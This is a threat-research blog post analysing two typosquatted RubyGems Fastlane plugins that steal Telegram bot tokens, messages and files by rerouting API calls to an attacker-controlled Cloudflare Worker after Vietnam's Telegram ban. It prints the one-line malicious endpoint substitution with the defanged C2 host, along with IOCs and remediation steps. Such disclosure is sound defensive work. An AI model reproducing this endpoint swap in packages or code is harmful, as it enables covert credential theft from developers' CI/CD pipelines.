---
title: "Malicious Ruby Gems Exfiltrate Telegram Tokens and Messages Following Vietnam Ban"
date: 2025-06-03 12:00:00 +0000
categories: [Malware, RubyGems]
tags: [Typosquatting, Fastlane, Ruby, Vietnam, Cloudflare Workers, T1195.002, T1036.005, T1041, T1078]
canonical_url: https://socket.dev/blog/malicious-ruby-gems-exfiltrate-telegram-tokens-and-messages-following-vietnam-ban
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/03ff0f25906b94f34c2dd85dc9967514614a090b-1024x1024.webp
  alt: "Malicious Ruby Gems Exfiltrate Telegram Tokens and Messages Following Vietnam Ban"
description: "Malicious Ruby gems typosquat Fastlane plugins to steal Telegram bot tokens, messages, and files, exploiting demand after Vietnam's Telegram ban."
---

Socket's Threat Research Team has uncovered an ongoing supply chain attack targeting the RubyGems ecosystem. A threat actor using the aliases `Bùi nam`, `buidanhnam`, and `si_mobile`, published two malicious gems (i.e. packages) ([`fastlane-plugin-telegram-proxy`](https://socket.dev/rubygems/package/fastlane-plugin-telegram-proxy/overview/0.1.6?platform=ruby) and [`fastlane-plugin-proxy_teleram`](https://socket.dev/rubygems/package/fastlane-plugin-proxy_teleram/overview/0.1.0?platform=ruby)) designed to impersonate legitimate [Fastlane](https://fastlane.tools/) plugins. These gems silently exfiltrate all data sent to the Telegram API by redirecting traffic through a command and control (C2) server controlled by the threat actor. This includes bot tokens, chat IDs, message content, and attached files.

The timing is notable: the gems appeared just days after Vietnam ordered nationwide [blocking](https://www.reuters.com/sustainability/society-equity/vietnam-acts-block-messaging-app-telegram-government-document-seen-by-reuters-2025-05-23/) of Telegram on May 21, 2025. Marketed as "proxy" plugins, they exploit the increased demand for Telegram workarounds. The branding and timing indicate that developers affected by the ban were the intended targets.

Because Fastlane runs inside CI/CD pipelines that handle sensitive assets like signing keys, release binaries, and environment secrets, the impact reaches deep into software build and release workflows.

At the time of publication, both gems remain live on RubyGems. We have petitioned for their removal.

## A Small Edit With Major Consequences

The malicious gems are near-identical clones of the legitimate [`fastlane-plugin-telegram`](https://socket.dev/rubygems/package/fastlane-plugin-telegram) project, a plugin widely used to send deployment notifications to Telegram channels from CI/CD pipelines. The threat actor copied the original README, preserved the public API, and retained the plugin's expected behavior. Only one critical line changed: the network endpoint used to send and receive Telegram messages.

In the legitimate plugin, the message is sent [directly](https://socket.dev/rubygems/package/fastlane-plugin-telegram/files/0.1.4/lib/fastlane/plugin/telegram/actions/telegram_action.rb?platform=ruby#L30) to Telegram's official API:

```ruby
uri = URI.parse("https://api.telegram.org/bot#{token}/sendMessage")
```

In the malicious versions, this endpoint is [replaced](https://socket.dev/rubygems/package/fastlane-plugin-telegram-proxy/files/0.1.6/lib/fastlane/plugin/telegram_proxy/actions/telegram_proxy_action.rb?platform=ruby#L30) with a hardcoded C2 controlled by the threat actor:

```ruby
# Threat actor's proxy C2 endpoint; not Telegram
uri = URI.parse("https://rough-breeze-0c37[.]buidanhnam95[.]workers[.]dev/bot#{token}/sendMessage")
```

This subtle change redirects every Telegram API call through the threat actor's relay. The plugin still returns valid responses from Telegram, making the behavior difficult to detect. Meanwhile, the relay silently exfiltrates the bot token, chat ID, message text, and any attached files. The endpoint substitution is the only malicious logic. Everything else, including parameter parsing, multipart uploads, and error handling, remains untouched. As a result, static analysis tools and unit tests may fail to flag the change.

There are no safeguards in the code. No geofencing. No sandbox checks. No conditional logic. The payload exfiltrates data every time it runs. Stolen tokens remain valid until manually revoked, making this a persistent and stealthy compromise.

By rerouting traffic through a proxy, the threat actor automatically captures:

- Bot tokens, which grant full access to the victim's Telegram bot, including the ability to read, delete, or send messages.
- Chat identifiers and message content.
- Any uploaded files, including potentially sensitive build artifacts or logs.
- Optional proxy credentials, if the user passes them to the plugin.

![Socket AI Scanner analysis of fastlane-plugin-telegram-proxy](https://cdn.sanity.io/images/cgdhsj6q/production/bcde961c907cda2642dcd422168d736ee97294d2-616x597.png)
_Socket AI Scanner's analysis of the malicious `fastlane-plugin-telegram-proxy` gem, including contextual details about its behavior and risks. The same level of analysis applies to the threat actor's other gem, `fastlane-plugin-proxy_teleram`._

## C2 Endpoint

The threat actor's C2 endpoint (`rough-breeze-0c37[.]buidanhnam95[.]workers[.]dev`) is hardcoded into both malicious Ruby gems as a substitute for the legitimate Telegram Bot API. All messages, bot tokens, chat IDs, and uploaded files are routed through this proxy without user consent or disclosure. Although the landing page claims the proxy "does not store or modify your bot tokens", this statement is both unverifiable and misleading. Cloudflare Worker scripts are not publicly visible, and the threat actor retains full ability to log, inspect, or alter any data in transit. The use of this proxy, combined with the typosquatting of a trusted Fastlane plugin, clearly indicates intent to exfiltrate tokens and message data under the guise of normal CI behavior. Moreover, the threat actor has not published the Worker's source code, leaving its implementation entirely opaque. In the context of credential-stealing behavior, this lack of transparency further reinforces the assessment that the proxy was deployed for malicious purposes.

![Threat actor's Cloudflare Worker endpoint](https://cdn.sanity.io/images/cgdhsj6q/production/5755a837dd9d561aa02cf72596a30c07aabd9b8c-1392x934.png)
_The threat actor's Cloudflare Worker endpoint (`rough-breeze-0c37[.]buidanhnam95[.]workers[.]dev`) presents itself as a benign Telegram Bot API proxy, claiming not to store or modify bot tokens. In reality, the proxy is embedded/hardcoded in malicious RubyGems and silently intercepts sensitive data passed through CI/CD pipelines._

## How a Legitimate Telegram Proxy Differs

A genuine proxy aimed at helping users bypass regional blocks would:

- Publish its source code under an open source license, allowing anyone to audit what happens to messages and tokens.
- Document the author or organization behind the project, including verifiable contact information, so users can assess reputation.
- Expose configuration options (e.g., `TELEGRAM_PROXY_URL`) instead of hardcoding a single domain into the library.
- Provide opt‑in use: the proxy endpoint would be an optional parameter, not the default, and certainly not a silent replacement for `api.telegram.org`.
- Offer self‑hosting guidance so organizations can run their own instance rather than trusting an unknown third‑party server.
- Include privacy and logging policies making clear what data, if any, is stored, for how long, and why.
- Pass independent security reviews or at least community scrutiny — no legitimate proxy hides its implementation behind a private Cloudflare Worker.

The malicious gems do none of the above. They hide the proxy endpoint, offer no transparency, and silently exfiltrate tokens and message data — hallmarks of a credential‑stealing supply chain attack rather than a legitimate proxy tool.

## Typosquatting and Deception

The impersonated, legitimate gem `fastlane-plugin-telegram` has over 600,000 downloads. The minor name variations the threat actor made, which included a one-letter misspelling (`teleram`) and an added suffix (`-proxy`), enabled the malicious gems (`fastlane-plugin-proxy_teleram` and `fastlane-plugin-telegram-proxy`) to blend into the broader RubyGems ecosystem.

To strengthen the deception, the threat actor forked the official repository hosted at `github.com/sergpetrov/fastlane-plugin-telegram` and linked their fork (`github[.]com/buidanhnam/fastlane‑plugin‑telegram`) as the homepage for the malicious `fastlane-plugin-telegram-proxy` gem.

![Search results showing malicious gems alongside legitimate plugins](https://cdn.sanity.io/images/cgdhsj6q/production/812f751b9d3d0f641b97f013aea6d44d4beb94be-948x888.png)
_Search results for `fastlane-plugin-telegram` on RubyGems show the malicious typosquatted gem `fastlane-plugin-telegram-proxy` ranked alongside legitimate plugins. Another malicious gem, `fastlane-plugin-proxy_teleram`, appears when searching with a similarly mistyped query. Both gems impersonate trusted Fastlane gems and redirect Telegram API traffic through a threat actor-controlled proxy to steal sensitive data._

## Vietnam Context and Attribution Assessment

The threat actor operates on RubyGems under the name `Bùi nam`, a Vietnamese-formatted identity that includes native diacritics. The timing and theme of the malicious campaign is closely aligned with recent geopolitical events in Vietnam. On May 21, 2025, Vietnam's Ministry of Information and Communications ordered internet service providers to block access to Telegram nationwide and required them to report compliance by June 2, 2025, as [reported](https://www.reuters.com/sustainability/society-equity/vietnam-acts-block-messaging-app-telegram-government-document-seen-by-reuters-2025-05-23/) by Reuters.

On May 24 and May 30, 2025, just days after the ban, the threat actor released two malicious Ruby gems, marketing them as "Telegram proxy" helpers. This positioning directly targeted the surge in demand from developers affected by the block, especially those seeking ways to restore Telegram-based build notifications or CI workflows.

![RubyGems profile for Bùi nam](https://cdn.sanity.io/images/cgdhsj6q/production/357d94cf03bf539b1fb40c17aeada0e0ac3c64b0-877x448.png)
_The RubyGems profile for `Bùi nam` (`si_mobile`) shows authorship of two malicious Fastlane plugins: `fastlane-plugin-telegram-proxy` and `fastlane-plugin-proxy_teleram`, both designed to exfiltrate Telegram tokens and message data via a threat actor-controlled proxy endpoint. The gems were published on May 24 and May 30, 2025, shortly after Vietnam's nationwide Telegram ban._

The available evidence suggests that the threat actor deliberately aligned the campaign with geopolitical events in Vietnam. The use of a Vietnamese-formatted identity and the release of "Telegram proxy" gems shortly after the nationwide ban indicate awareness of local conditions and a strategic effort to exploit them. The timing and thematic alignment strongly support the likelihood that the campaign was designed to opportunistically target Vietnam-based developers seeking Telegram workarounds.

At the same time, the malware itself is not region-specific. The code contains no geofencing, locale checks, or conditional logic to limit its execution to Vietnamese systems. It exfiltrates Telegram tokens and message data from any environment where the gems are installed. This indicates a broader intent: the campaign casts a wide net and affects any developer or organization that unknowingly integrates the malicious gems. While the lure is tailored to Vietnam, the impact is global. Anyone who installs `fastlane-plugin-telegram-proxy` or `fastlane-plugin-proxy_teleram` is exposed to credential theft, data exfiltration, and potential compromise of CI/CD workflows, regardless of geography.

## Outlook and Recommendations

This campaign illustrates how quickly threat actors can exploit geopolitical events to launch targeted supply chain attacks. By weaponizing a widely used development tool like Fastlane and disguising credential-stealing functionality behind a timely "proxy" feature, the threat actor leveraged trust in package ecosystems to infiltrate CI/CD environments.

Defenders should anticipate follow-on activity. Similar typosquatting campaigns may emerge in response to future blocks, outages, or policy shifts affecting messaging platforms, VPNs, or other developer tools. The threat actor's use of minimal code changes, controlled C2 relays, and cloned repositories sets a low barrier to replication, making it likely that similar tactics will appear across other ecosystems such as PyPI, npm, and Go Modules.

Affected organizations should immediately remove the two malicious gems (`fastlane-plugin-telegram-proxy` and `fastlane-plugin-proxy_teleram`), lock trusted dependency versions, and rebuild any mobile binaries produced on or after May 30, 2025. All Telegram bot tokens previously used with Fastlane should be considered compromised and rotated. To prevent further credential leakage, configure egress rules to block traffic to `*.workers[.]dev` unless explicitly required, and review logs for any connections to `hxxps://rough-breeze-0c37[.]buidanhnam95[.]workers[.]dev`.

Socket's free tools help detect and prevent these types of supply chain attacks before they compromise development environments. The [**Socket GitHub app**](https://socket.dev/features/github) scans pull requests for suspicious changes, including hardcoded network redirects like the C2 endpoint used in this campaign. The [**Socket CLI**](https://socket.dev/features/cli) flags malicious behavior during `bundle install`, such as gems that initiate unexpected outbound connections. The [**Socket browser extension**](https://socket.dev/features/web-extension) displays risk scores and identifies typosquatted packages as you browse or search RubyGems, making it easier to spot deceptive variants like `telegram-proxy` or `proxy_teleram` before they are installed.

## Indicators of Compromise (IOCs)

**Malicious Ruby Gems**

- `fastlane‑plugin‑proxy_teleram`
- `fastlane‑plugin‑telegram‑proxy`

**C2 Endpoint**

- `hxxps://rough‑breeze‑0c37[.]buidanhnam95[.]workers[.]dev`

**Threat Actor Identifiers**

- RubyGems aliases
  - `Bùi nam`
  - `buidanhnam`
  - `si_mobile`
- `hxxps://github[.]com/buidanhnam/fastlane‑plugin‑telegram` — GitHub repository
- `buidanhnam` — GitHub alias

## MITRE ATT&CK Techniques

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1036.005 — Masquerading, Match legitimate name or location
- T1041 — Exfiltration over C2 channel
- T1078 — Valid Accounts
